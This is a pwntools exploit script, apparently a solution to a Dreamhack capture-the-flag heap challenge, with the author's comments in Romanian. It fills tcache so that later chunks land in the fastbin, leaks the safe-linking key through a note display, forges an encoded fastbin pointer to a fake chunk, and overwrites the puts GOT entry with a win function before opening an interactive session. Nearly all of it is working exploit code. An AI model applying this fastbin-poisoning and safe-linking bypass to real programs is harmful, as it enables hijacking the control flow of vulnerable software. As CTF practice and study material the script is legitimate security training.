from pwn import *
elf =  ELF("./note_patched")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:15782'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#win
#chunks ptr at 0x4040A8
#dont need libc leak, just need overwrite got...

win = 0x401256
#gdb.attach(p)

def create(idx, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
    p.recvuntil(b": ")
    p.sendline(idx)
    
    p.recvuntil(b": ")
    p.sendline(size)
    
    p.recvuntil(b": ")
    p.send(data)

def show(idx):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    
    p.recvuntil(b": ")
    p.sendline(idx)

def delete(idx):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    
    p.recvuntil(b": ")
    p.sendline(idx)
    

def update(idx, data):
    p.recvuntil(b"> ")
    p.sendline(b"3")

    p.recvuntil(b": ")
    p.sendline(idx)
    
    p.recvuntil(b": ")
    p.send(data)
    
 #am facut niste reseach sa zicem; calloc NU ia din tchache
#putem ajunge in fastbin doar dupa ce tchache e plin


for i in range(0, 9):
    create(str(i).encode(), b"24", chr(0x41+i).encode()*0x18)
    
create(b"9", b"33", b"hii")
    
for i in range(0, 9):
    delete(str(i).encode())    

#chunk nr 7, 8 ends in fastbin! nice! 8 is head tho
#next time creating a chunk, its calloc-ed from fastbin
#i made two so that we can malloc twice after

#why 0x41cf76 instead of puts got(?) lol
#OK - concept nou - deci safe linking
#practic daca noi scriem in fd 0xdeadbeef, locatia care o fie folosita de fastbins
#daca ptr = 0xaaaabbb, o sa fie 0xdeadbeef ^ 0xaaaa. pt ca e >> 12 adica primul byte jumate.
#primul fastbin head pare ca contine acest leakulet. (7)

puts = elf.got[b"puts"]
show(b"7")
p.recvuntil(b": ")
data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))

print(hex(val))

#si acum noi trimitem fd ^ val ca sa facem bypass la security

#ii dam 0x404138 -0x8 ca sa aiba size valid. apoi practic, suprascriem loc din ptr la acel chonk

puts_pro = puts ^ val
ptr_fake = (0x404138 -0x8) ^ val

update(b"8", p64(ptr_fake) + b'\x00' * 0x10)

create(b"2", b"24", b"A"*0x18)
create(b"1", b"24", p64(puts))

update(b"9", p64(win))

#daca specificam 0x4040a8?
#atunci are valid size
#si scriem in ptr table lol
#doar ca acel chunk ar trebui sa fie 0x21.

p.interactive()
